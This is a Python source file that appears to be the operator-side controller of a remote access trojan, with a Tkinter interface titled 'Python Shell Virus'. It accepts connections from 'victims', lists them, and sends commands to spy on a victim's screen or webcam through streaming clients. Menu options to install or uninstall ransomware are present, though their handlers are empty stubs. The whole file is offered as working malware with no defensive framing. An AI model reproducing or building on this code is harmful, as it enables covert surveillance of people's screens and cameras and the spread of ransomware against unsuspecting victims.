import socket
import threading
from host_constants import *
import tkinter as tk
import ScreenSharing.client.client as screenSharingClient
import WebCamSharing.client.client as webCamSharingClient

victims = {}


def startServer():
    print("Starting server...")
    print("Watiting for victims to connect...")

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(( HOST_IP,   HOST_PORT))
    server_socket.listen()


    while True:
        clientSoc, clientAddr = server_socket.accept()
        print(f"{clientAddr} Has been connected!")
        threading.Thread(target=handleVictim, args=(
            clientSoc, clientAddr, )).start()


def handleVictim(soc, socAddr):
    victims[socAddr] = soc


def processCommand(command, selectedVictim):

    print(f"command: {command}, victim: {selectedVictim}")

    print("Sending command!")
    sendCommand(command, victims[selectedVictim])
    print("Command has been sent!")

    if command ==  WATCH_SCREEN_COMMAND:
        ip, port = victims[selectedVictim].recv(1024).decode().split(' ')
        port = int(port)
        threading.Thread(target=screenSharingClient.main, args=(ip, port)).start()

    elif command ==  WATCH_WEBCAM_COMMAND:
        ip, port = victims[selectedVictim].recv(1024).decode().split(' ')
        port = int(port)
        threading.Thread(target=webCamSharingClient.main, args=(ip, port)).start()

    elif command ==  INSTALL_RANSOMWARE_COMMAND:
        pass

    elif command ==  UNINSTALL_RANSOMWARE_COMMAND:
        pass


def sendCommand(command, victimSoc):
    victimSoc.send(command.encode())

def reloadWindow(window):
    print("Reloading UI...")
    window.destroy()
    buildUI()


def buildUI():
    print("Building UI...")

    window = tk.Tk()
    window.title("Python Shell Virus")

    # for scrolling vertically
    yscrollbar = tk.Scrollbar(window)
    yscrollbar.pack(side = tk.RIGHT, fill = tk.Y)

    # Headers Labels
    tk.Label(text="Welcome To The Python Virus Shell!").pack()
    tk.Label(text="What Would You Like To Do?").pack()


    # Opertaion list
    variable = tk.StringVar(window)
    variable.set("Watch Screen") # default value
    opertaionList = tk.OptionMenu(window, variable,  WATCH_SCREEN_COMMAND,  WATCH_WEBCAM_COMMAND,  INSTALL_RANSOMWARE_COMMAND,  UNINSTALL_RANSOMWARE_COMMAND)
    opertaionList.pack()

    # Victims list
    victims_list = tk.Listbox(window, selectmode = "single", 
                yscrollcommand = yscrollbar.set)
    # Widget expands horizontally and 
    # vertically by assigning both to
    # fill option
    victims_list.pack(padx = 10, pady = 10,
            expand = tk.YES, fill = "both")
    x = list(victims)
    
    for each_item in range(len(x)):
        victims_list.insert(tk.END, x[each_item])
        victims_list.itemconfig(each_item, bg = "lime")


    # Attach listbox to vertical scrollbar
    yscrollbar.config(command = victims_list.yview)

    # Start Button
    startBtn = tk.Button(
        text="Start!",
        command= lambda: processCommand(variable.get() ,victims_list.get(tk.ACTIVE)),
    )
    startBtn.pack()

    # Reload Button
    reloadBtn = tk.Button(
        text="Reload!",
        command= lambda : reloadWindow(window),
    )
    reloadBtn.pack()

    window.mainloop()




def main():
    threading.Thread(target=startServer).start()
    buildUI()    

if __name__ == "__main__":
    main()
